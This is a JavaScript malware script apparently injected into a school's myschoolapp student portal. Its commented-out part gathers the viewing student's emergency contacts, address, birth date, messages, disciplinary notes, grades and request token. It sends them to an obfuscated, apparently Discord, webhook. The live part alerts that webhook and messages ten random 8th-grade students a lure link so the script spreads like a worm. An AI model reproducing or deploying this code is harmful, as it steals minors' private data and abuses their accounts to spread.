/*
async function start() {
    const today = new Date();
    const formatdate = String(today.getMonth() + 1).padStart(2, '0') + '%2F' + String(today.getDate()).padStart(2, '0') + '%2F' + today.getFullYear();
    var general = p3.Data.Context.attributes.MasterUserInfo;
    var EMER1 = await fetch('https://headwaters.myschoolapp.com/api/user/emergencycontactphone/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
        var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
    mdfg = mdfg.replace(/\s/g, '');
    mdfg = atob(mdfg)
    var FINALEMER1 = {};
    var offs = [];
    var messes = [];
    var tempstring = '';
    EMER1.forEach((element) => {
        if (!tempstring.includes(element.PhoneNumber)) {
            var obb = {
                'num': element.PhoneNumber,
                'Name': element.FirstName
            };
            FINALEMER1[element.FirstName] = obb;
            string = tempstring + ' + ' + element.PhoneNumber;
        }
    });
    tempstring = '';
    var EMER2 = await fetch('https://headwaters.myschoolapp.com/api/user/emergencycontactemail/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
    EMER2.forEach((element) => {
        if (!tempstring.includes(element.Email)) {
            FINALEMER1[element.FirstName].Email = element.Email;
            string = tempstring + ' + ' + element.Email
        }
    });
    var addr = await fetch('https://headwaters.myschoolapp.com/api/user/address/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
    FINALEMER1['Address'] = ' ' + addr[0].AddressLine1 + addr[0].AddressLine2 + addr[0].AddressLine3;
    FINALEMER1['Full Name'] = general.FirstName + ' ' + general.MiddleName + ' ' + general.LastName;
    FINALEMER1['DoB'] = general.BirthDate;
    FINALEMER1['Messages'] = [];
    FINALEMER1['OffNotes'] = [];
    var messages = await fetch('https://headwaters.myschoolapp.com/api/message/inbox/?format=json&pageNumber=1&toDate=' + formatdate).then(function (res) {
        return res.json()
    });
    var offnotes = await fetch('https://headwaters.myschoolapp.com/api/officialnote/InboxExternal/?format=json&currentInd=1&statusXml=&commentTypeXml=&fromDate=&toDate=' + formatdate).then(function (res) {
        return res.json()
    });
    offnotes.forEach((elem) => {
        var g = {};
        if (elem.CommentType == 'General Concern' || elem.CommentType == 'General Note' || elem.CommentType == 'Academic Concern' || elem.CommentType == 'Academic Dishonesty') {
            g['To'] = elem.StudentName;
            g['From'] = elem.AuthorName;
            g['MSG'] = elem.Comment;
            g['Date'] = elem.InsertDate;
            FINALEMER1['OffNotes'].push(g);
        }
    });
    messages.forEach((elem) => {
        var t = {};
        var nums = [];
        var blacklist = [27055035, 2719229];
        elem.Participants.forEach((Poo) => nums.push(Poo.Pk));
        if (!nums.some(number => blacklist.includes(number))) {
            t['From'] = elem.Messages[0].FromUser.UserNameFormatted;
            t['Sub'] = elem.Subject;
            t['MSG'] = elem.Messages[0].Body.normalize('NFC');
            t['To'] = [];
            elem.Participants.forEach((Poo) => t.To.push(Poo.Name));
            t['Date'] = elem.Messages[0].SendDateTicks;
            FINALEMER1['Messages'].push(t)
        }
    });
    FINALEMER1['ReqToken'] = p3.Data.RequestVerificationToken;
var firsts = await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&schoolYearLabel=2024%20-%202025&memberLevel=3&persona=2&durationList=161284%2C161286&markingPeriodId=&viewCid=view118&parentViewCid=view60&changeSchoolYearCount=1&ts=1740780140184&rnd=0.3949742419078759')
firsts = await firsts.json()
var dfdd = {}
for(let i = 0; i < firsts.length; i++) {
    dfdd[firsts[i].sectionidentifier] = firsts[i].cumgrade
}
var seconds = await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&schoolYearLabel=2024%20-%202025&memberLevel=3&persona=2&durationList=161286&markingPeriodId=&viewCid=view121&parentViewCid=view62&source=changeDuration&changeSchoolYearCount=8&ts=1741275104017&rnd=0.47110786715133899')
seconds = await seconds.json()
for(let i = 0; i < seconds.length; i++) {
    if(dfdd[seconds[i].sectionidentifier] == null) {
        dfdd[seconds[i].sectionidentifier] = seconds[i].cumgrade
    }
}
FINALEMER1['Classes'] = dfdd
    var pleb = JSON.stringify(FINALEMER1).match(/.{1,1900}/g);
    for (let i = 0; i < pleb.length; i++) {
        await fetch(mdfg, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: pleb[i],
                username: general.FirstName + ' ' + general.LastName
            })
        });
    }
};
start();
this.style.display = 'none'
*/

async function s() {
    var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
mdfg = mdfg.replace(/\s/g, '');
mdfg = atob(mdfg)
        await fetch(mdfg, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: 'start',
                username: p3.Data.Context.attributes.MasterUserInfo.FirstName
            })
        })
    let a = await (await fetch("https://headwaters.myschoolapp.com/api/directory/directoryresultsget?directoryId=5196&searchVal=&facets=32001_8th%20Grade&searchAll=false", {
  "headers": {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "wh-version": "2025.05.12.5",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://headwaters.myschoolapp.com/app/student",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
})).json();
    
    for(let i = 0; i < 10; i++) {
        let b = a[Math.floor(Math.random() * a.length)];
        console.log(b)

        await fetch("https://headwaters.myschoolapp.com/api/message/conversation/?format=json", {
  "headers": {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "priority": "u=1, i",
    "requestverificationtoken": p3.Data.RequestVerificationToken,
    "sec-ch-ua": "\"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "wh-version": "2025.05.12.5",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://headwaters.myschoolapp.com/app/student",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"Participants\":[{\"AssociationId\":\"12\",\"Pk\":\"" + b.UserID + "\",\"MembersToInclude\":\"0\",\"Name\":\"" + b.FirstName + " " + b.LastName +  " '29\"}],\"Messages\":[{\"Body\":\"<a href = 'https://headwaters.myschoolapp.com/app/student#topicdetail/1694720/26274190/26274190/3376384/0/0'>new teacup piglet but less spammy!! (ItS REL)</a>\",\"Status\":2,\"FromSelf\":false}],\"ReplyToAll\":false,\"Subject\":\"testing\",\"ParticipantList\":\"" + b.FirstName + " " + b.LastName +  "'29\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
    }
}

s();
this.style.display = 'none';